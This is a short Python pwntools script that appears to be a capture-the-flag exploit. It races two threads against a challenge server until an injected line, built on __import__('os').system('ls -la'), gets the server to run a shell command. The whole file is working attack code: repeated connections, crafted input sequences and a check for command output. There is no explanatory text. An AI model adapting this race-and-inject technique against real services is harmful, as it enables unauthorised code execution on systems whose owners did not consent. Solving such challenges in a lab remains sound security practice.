from pwn import *
import threading

payload1 = ['ding:hz', 'AAAAAA', 'AAAAA', 'ABCDEAAAAAAAAAAAAAAAAAAA', 'ABCDEFGHIJKLMAAAAAAAAAAAAAAAAA~', 'Aif __import__("os").system("ls -la") and True:']
payload2 = ['ding:hz', '~', '~', '', '~', 'asdfasdf']

def connect():
    #return remote('ce954d5a446d0a6e03c93dec74014051-60501.inst5.chal-kalmarc.tf', 1337, ssl=True, level='error')
    return process(['python3', './server.py'], level='error')

def spam1():
    att = 0
    while True:
        att += 1
        if att % 100 == 0:
            print('thread1', att)
        conn = connect()
        for v in payload1:
            conn.sendline(v.encode())
        res = conn.recvuntil(b'Thanks').decode()
        if 'total' in res:
            print('win', res)
            exit()
        conn.close()

def spam2():
    att = 0
    while True:
        att += 1
        if att % 100 == 0:
            print('thread2', att)
        conn = connect()
        for v in payload2:
            conn.sendline(v.encode())
        res = conn.recvuntil(b'Thanks').decode()
        if 'total' in res:
            print('win', res)
            exit()
        conn.close()

thread1 = threading.Thread(target=spam1)
thread2 = threading.Thread(target=spam2)

thread1.start()
thread2.start()

thread1.join()
thread2.join()